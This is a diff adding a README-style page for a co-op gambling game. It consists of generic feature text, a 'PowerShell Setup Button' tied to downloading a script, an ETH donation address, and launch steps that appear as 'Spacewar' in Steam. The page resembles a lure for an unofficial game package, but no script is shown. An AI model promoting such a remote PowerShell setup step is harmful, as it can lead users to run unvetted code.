@@ -1,0 +1,85 @@
+Gamble With Your Friends Coop Notalin — Co-op Adventure
+
+⚡ PowerShell Setup Button
+
+Show your support
+
+ETH:&nbsp;0xA8aeE58CBB0Ea8233e8eAD8f23acc9B87Cad2435
+
+Gamble With Your Friends Coop Notalin is built for shared sessions where every decision is made together. You and your friends take on the same run, weighing risks as a group and living with the outcomes as a team. The game is designed around talking through choices, splitting attention, and coordinating your next move rather than playing alone. Expect a cooperative experience where the fun comes from the table talk and the collective gamble, not from going it solo.
+
+🔧 Requirements
+
+- OS: Windows 10 / 11
+- Shell: PowerShell 5.1+ or PowerShell 7+
+- Network: internet access to download the script
+- Privileges: standard user
+
+How to Start
+
+Getting your group into a session is quick and simple. First, open Steam and make sure it stays running in the background the whole time, since the game relies on it to connect players. Once Steam is up, launch the game while Steam is open. After it starts, the running game or session will appear in Steam as "Spacewar" — that is expected, so don't worry when you see that name in your friends list or status.
+
+Before diving in, it helps to agree with your friends on who will send the invitation, so nobody sits waiting while everyone assumes someone else is inviting. A quick chat about roles keeps things smooth.
+
+To play together, you have two easy options. You can wait for a friend's invitation and simply accept it when it arrives, which drops you straight into their session. Or you can invite your friends yourself so they can join you. Either way works, so pick whichever suits the group.
+
+Keep Steam open throughout, launch the game, confirm the "Spacewar" entry appears, and then join or invite as agreed. That's all there is to it.
+
+Features
+
+- Shared risk, shared reward: Every bet is a group decision. Talk through the odds, commit together, and live with the outcome as a team.
+- Built for table talk: The core loop is designed around discussion, bluffing, and calling each other out, so the fun comes from the conversation as much as the result.
+- Co-op sessions from the start: Gather your friends, start a session, and play through rounds together, with the group working toward a common goal rather than competing against one another.
+- Team play that matters: Coordinate your choices, cover for each other's guesses, and decide when to play it safe and when to push your luck.
+- Round-based pacing: Each round gives everyone a chance to weigh in, make a call, and see how the group's decision plays out before the next one begins.
+- Readable outcomes: Results are presented clearly so the whole group can see what happened and plan the next move together.
+- Drop-in group rhythm: Sessions are structured so friends can settle in, play a stretch of rounds, and pick up the thread again later.
+
+How It Works
+
+Gamble With Your Friends Coop Notalin is built around one idea: the risk is shared, so the fun is shared. You and your friends take on the same run together, and every bet, bluff, and bold call plays out in front of the whole group rather than in separate silos. The game keeps everyone in the same conversation about what to push for and what to walk away from, so decisions feel like group decisions.
+
+Here is the rhythm of a session. You gather your group, settle on how you want to approach the run, and then play through rounds where each choice carries weight for the team. Some moments ask you to commit together; others let one player take the lead while the rest read the table and react. Wins build momentum for everyone, and setbacks are something the group absorbs and plays around rather than a single player's problem. The intended experience is loud, social, and full of second-guessing in the best way — you should hear your friends groaning at a bad call and cheering a risky one that pays off.
+
+Cooperation shows up in how you talk, plan, and cover for each other. You will find yourselves negotiating odds, talking each other into or out of a gamble, and deciding when to play it safe to protect what the group has built. The game is designed so that communication is the real mechanic: the table talk is where the strategy lives, and the shared outcome is what makes each round matter.
+
+Because the focus is on playing together, the game is meant to be picked up and enjoyed in a group setting without a long setup ritual. You start a session, get everyone oriented, and get to the gambling and the banter quickly. Every run is a fresh chance to see how your group handles pressure, luck, and each other — and to find out which of your friends has the nerve to double down when everyone else says stop.
+
+Modules and Settings
+
+Shared Betting Table
+This module gives the group a single, synchronized place to put wagers down before each round in gamble-with-your-friends-coop-notalin, so no one has to keep track of bets in chat or on paper.
+- A round timer setting controls how long the table stays open for new wagers, giving slower friends a chance to join before betting closes.
+- A table visibility option lets the host decide whether stakes stay hidden until reveal or are shown live as they are placed.
+- A lock-wagers control closes the table early once everyone has committed, moving the group straight to the round.
+
+Round Outcome Settlement
+This module records what actually happened in the round and turns the betting table into visible gains and losses for each friend.
+- An outcome confirmation step lets the host enter the result once and have every recorded wager settled against it in one pass.
+- A correction option allows the host to amend an outcome when the group agrees a result was entered wrong, recalculating balances accordingly.
+- A settlement summary presents each participant's gain or loss so the whole group sees the same numbers at the same time.
+
+Stakes and Balance Rules
+This module holds the group's agreed rules for how much can be wagered and where everyone starts, keeping the co-op session fair from the first round.
+- Starting balance settings assign each friend their opening resources before play begins, and can differ per player if the group prefers.
+- Per-round minimum and maximum stake limits bound what anyone can put on a single round, and the table enforces them at placement time.
+- Rule presets can be saved between sessions so the group can return to a familiar pace without re-entering every value.
+
+Lobby and Player Roster
+This module manages who is in the betting pool, feeding the player list that the table and settlement steps rely on.
+- Add, rename, and remove controls let the host shape the roster before the session opens, with changes reflected everywhere the player appears.
+- A roster status view shows which friends are still active in the pool, so the group can see who remains eligible to bet.
+- Starting resources can be reassigned from the roster, keeping player setup and balance rules in one place.
+
+Round History Log
+This module keeps a running record of the session so decisions can be reviewed and disputes settled without relying on memory.
+- Each entry captures the wagers placed, the confirmed outcome, and the resulting balance changes for every participant.
+- A scrollable session view lets players look back at earlier rounds while the current table stays open.
+- An annotation field lets the host attach a short note to a round, useful for labeling unusual or disputed outcomes.
+
+Session Reset and New Match
+This module handles endings and restarts, carrying the roster and rules forward so a new match does not mean rebuilding the lobby.
+- A reset balances option returns every player to their configured starting values while leaving the roster intact.
+- A clear history control starts a fresh round log for a new match, with a choice to keep or discard the previous session's record before it is cleared.
+
+…（内容已截断）
